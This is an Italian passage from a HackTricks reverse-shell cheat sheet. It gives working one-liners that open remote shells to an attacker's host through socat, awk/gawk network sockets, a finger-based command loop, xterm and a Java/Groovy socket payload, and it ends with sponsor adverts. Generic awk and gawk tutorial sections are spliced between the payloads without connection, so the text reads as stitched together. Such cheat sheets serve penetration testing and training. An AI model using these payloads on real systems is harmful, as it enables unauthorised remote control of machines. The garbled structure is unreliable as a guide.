Ci sono diverse varianti di shell inversa, ma il concetto di base è lo stesso. L'hacker crea un payload che viene eseguito sul sistema di destinazione. Questo payload stabilisce una connessione di rete tra il sistema di destinazione e il sistema controllato dall'hacker. Una volta stabilita la connessione, l'hacker può inviare comandi al sistema di destinazione e ricevere i risultati.

La shell inversa è spesso utilizzata durante un test di penetrazione per ottenere l'accesso a un sistema remoto e sfruttare eventuali vulnerabilità presenti. È importante notare che l'utilizzo di una shell inversa senza il consenso del proprietario del sistema è illegale e può comportare conseguenze legali.
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
## Awk

Awk è un potente strumento di manipolazione dei dati che può essere utilizzato per filtrare e manipolare i dati in modo efficiente. È particolarmente utile per l'elaborazione di file di testo strutturati.

### Sintassi di base

La sintassi di base di Awk è la seguente:

```bash
awk 'pattern { action }' file
```

- `pattern` specifica il criterio per selezionare le righe da elaborare.
- `action` specifica l'azione da eseguire sulle righe selezionate.

### Esempi di utilizzo

Ecco alcuni esempi di utilizzo di Awk:

- Per stampare tutte le righe di un file:

```bash
awk '{ print }' file
```

- Per stampare solo la terza colonna di un file delimitato da spazi:

```bash
awk '{ print $3 }' file
```

- Per sommare i valori della quarta colonna di un file delimitato da virgole:

```bash
awk -F ',' '{ sum += $4 } END { print sum }' file
```

- Per contare il numero di righe in un file:

```bash
awk 'END { print NR }' file
```

### Variabili predefinite

Awk fornisce alcune variabili predefinite che possono essere utilizzate nelle azioni:

- `NR`: il numero di righe lette fino a quel punto.
- `NF`: il numero di campi nella riga corrente.
- `$0`: la riga corrente completa.
- `$1`, `$2`, ..., `$NF`: i campi della riga corrente.

### Operatori

Awk supporta diversi operatori che possono essere utilizzati nelle azioni:

- Operatori aritmetici: `+`, `-`, `*`, `/`, `%`.
- Operatori di confronto: `==`, `!=`, `<`, `>`, `<=`, `>=`.
- Operatori logici: `&&`, `||`, `!`.

### Funzioni

Awk fornisce anche diverse funzioni che possono essere utilizzate nelle azioni:

- `print`: stampa il valore specificato.
- `printf`: stampa il valore specificato con un formato specifico.
- `length`: restituisce la lunghezza di una stringa o il numero di elementi in un array.
- `substr`: restituisce una sottostringa di una stringa.
- `split`: divide una stringa in un array di elementi.
- `tolower`: converte una stringa in minuscolo.
- `toupper`: converte una stringa in maiuscolo.

### Conclusioni

Awk è uno strumento potente per la manipolazione dei dati in Linux. Conoscere la sua sintassi di base, le variabili predefinite, gli operatori e le funzioni ti consentirà di sfruttare appieno il suo potenziale.
```bash
awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```
L'attaccante può utilizzare il comando `finger` per ottenere informazioni sugli utenti di un sistema Linux. Il comando `finger` può fornire dettagli come il nome dell'utente, il nome completo, l'ultimo accesso, l'indirizzo email e altro ancora. Queste informazioni possono essere utili per raccogliere informazioni di intelligence sugli utenti del sistema target. 

Ecco un esempio di utilizzo del comando `finger`:

```bash
finger username@hostname
```

Sostituisci `username` con il nome dell'utente di cui desideri ottenere informazioni e `hostname` con l'indirizzo IP o il nome del sistema target.
```bash
while true; do nc -l 79; done
```
Per inviare il comando, scrivilo, premi Invio e premi CTRL+D (per interrompere STDIN)

**Vittima**
```bash
export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null')`; sleep 1; done

export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null | grep '!'|sed 's/^!//')`; sleep 1; done
```
## Gawk

Gawk è un potente strumento di manipolazione dei dati che viene spesso utilizzato nel contesto del penetration testing. È un interprete di comandi che consente di elaborare e manipolare i dati in modo flessibile. Gawk è particolarmente utile per l'estrazione e la manipolazione di dati strutturati, come ad esempio i file di log.

### Installazione di Gawk

Per installare Gawk su un sistema Linux, è possibile utilizzare il gestore dei pacchetti del sistema. Ad esempio, su Ubuntu è possibile eseguire il seguente comando:

```bash
sudo apt-get install gawk
```

### Utilizzo di Gawk

Gawk viene utilizzato principalmente per elaborare file di testo, ma può anche essere utilizzato per manipolare altri tipi di dati. Di seguito sono riportati alcuni esempi di comandi Gawk comuni:

- `awk '{print $1}' file.txt`: questo comando stampa la prima colonna di un file di testo.
- `awk '/pattern/ {print $0}' file.txt`: questo comando stampa le righe che corrispondono a un determinato pattern.
- `awk '{sum += $1} END {print sum}' file.txt`: questo comando calcola la somma della prima colonna di un file di testo e la stampa alla fine.
- `awk -F: '{print $1}' /etc/passwd`: questo comando stampa il nome utente dalla riga del file `/etc/passwd`, utilizzando `:` come delimitatore di campo.

### Script Gawk

Gawk supporta anche la scrittura di script più complessi per l'elaborazione dei dati. Gli script Gawk sono costituiti da una serie di regole, ognuna delle quali specifica un pattern e un'azione da eseguire quando il pattern viene trovato. Di seguito è riportato un esempio di uno script Gawk:

```awk
#!/usr/bin/gawk -f

BEGIN {
    FS = ","
    print "Nome, Cognome"
}

{
    print $2 ", " $1
}
```

Questo script legge un file CSV con due colonne (nome e cognome) e inverte l'ordine delle colonne nella stampa.

### Risorse aggiuntive

- [Documentazione ufficiale di Gawk](https://www.gnu.org/software/gawk/manual/gawk.html)
- [Tutorial su Gawk](https://www.tutorialspoint.com/awk/index.htm)
```bash
#!/usr/bin/gawk -f

BEGIN {
Port    =       8080
Prompt  =       "bkd> "

Service = "/inet/tcp/" Port "/0/0"
while (1) {
do {
printf Prompt |& Service
Service |& getline cmd
if (cmd) {
while ((cmd |& getline) > 0)
print $0 |& Service
close(cmd)
}
} while (cmd != "exit")
close(Service)
}
}
```
## Xterm

Questo proverà a connettersi al tuo sistema alla porta 6001:
```bash
xterm -display 10.0.0.1:1
```
Per catturare la reverse shell puoi utilizzare (che ascolterà sulla porta 6001):
```bash
# Authorize host
xhost +targetip
# Listen
Xnest :1
```
## Groovy

di [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) NOTA: Anche le reverse shell di Java funzionano per Groovy.
```bash
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
## Riferimenti
* [https://highon.coffee/blog/reverse-shell-cheat-sheet/](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
* [http://pentestmonkey.net/cheat-sheet/shells/reverse-shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell)
* [https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/](https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)


<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Trova le vulnerabilità che contano di più in modo da poterle correggere più velocemente. Intruder traccia la tua superficie di attacco, esegue scansioni proattive delle minacce, trova problemi in tutta la tua infrastruttura tecnologica, dalle API alle applicazioni web e ai sistemi cloud. [**Provalo gratuitamente**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) oggi stesso.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT**](https://opensea.io/collection/the-peass-family) esclusivi
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai repository github di** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
